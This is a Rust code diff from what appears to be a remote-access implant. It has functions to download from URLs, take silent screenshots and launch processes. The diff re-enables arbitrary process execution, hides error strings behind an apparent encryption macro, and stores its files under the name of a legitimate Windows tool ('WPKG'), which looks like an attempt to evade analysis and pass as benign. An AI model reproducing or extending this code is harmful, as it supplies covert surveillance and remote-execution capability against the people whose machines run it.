@@ -40,14 +40,14 @@ pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()> {
     Ok(())
 }
 
-// pub fn run_process_real(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
-//     if wait {
-//         Command::new(exe).args(args).output()?;
-//     } else {
-//         Command::new(exe).args(args).spawn()?;
-//     }
-//     Ok(())
-// }
+pub fn run_process_real(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
+    if wait {
+        Command::new(exe).args(args).output()?;
+    } else {
+        Command::new(exe).args(args).spawn()?;
+    }
+    Ok(())
+}
 
 pub fn run_process_with_output(exe: &str, args: Vec<&str>) -> anyhow::Result<Output> {
     let mut full_command: Vec<String> = vec![];
@@ -144,19 +144,19 @@ pub fn get_working_dir() -> anyhow::Result<String> {
     {
         use std::env;
 
-        let path = format!("{}/{}", env::current_dir()?.display(), "WorkDir");
+        let path = format!("{}/WorkDir", env::current_dir()?.display());
         if !Path::new(&path).exists() {
             fs::create_dir(&path)?;
         }
 
         Ok(path)
     }
-
     #[cfg(target_os = "windows")]
     {
         use platform_dirs::AppDirs;
 
-        let app_dirs = AppDirs::new(Some("WPKG"), true).context("Error")?;
+        let app_dirs = AppDirs::new(Some("WPKG"), true)
+            .context(crypto!("Failed to get WPKG app directory"))?;
         let config_dir = app_dirs.config_dir.display().to_string();
 
         if !Path::new(&config_dir).exists() {
@@ -170,22 +170,27 @@ pub fn get_working_dir() -> anyhow::Result<String> {
 pub fn screenshot() -> anyhow::Result<String> {
     info_crypt!("Creating screenshot...");
 
-    let screens = Screen::all().ok_or_else(|| anyhow!("Can't take ss!"))?;
+    let screens = Screen::all().ok_or_else(|| anyhow!(crypto!("Failed to takie screenshot")))?;
 
     if screens.is_empty() {
-        return Err(anyhow!("Screen is empty"));
+        return Err(anyhow!(crypto!("Screen is empty")));
     }
 
     let image = screens
         .get(0)
-        .context("Could not find screens")?
+        .context(crypto!("Could not find screens"))?
         .capture()
-        .context("empty img")?;
+        .context(crypto!("Empty image"))?;
     let buffer = image.buffer();
 
     // Save the image.
     let mut rng = rand::thread_rng();
-    let save_path = format!("{}/img-{}.png", get_working_dir()?, rng.gen::<i32>());
+    let save_path = format!(
+        "{work_dir}/{rand}{ext}",
+        work_dir = get_working_dir()?,
+        rand = rng.gen::<i32>(),
+        ext = ".png",
+    );
 
     fs::write(&save_path, &buffer)?;
 
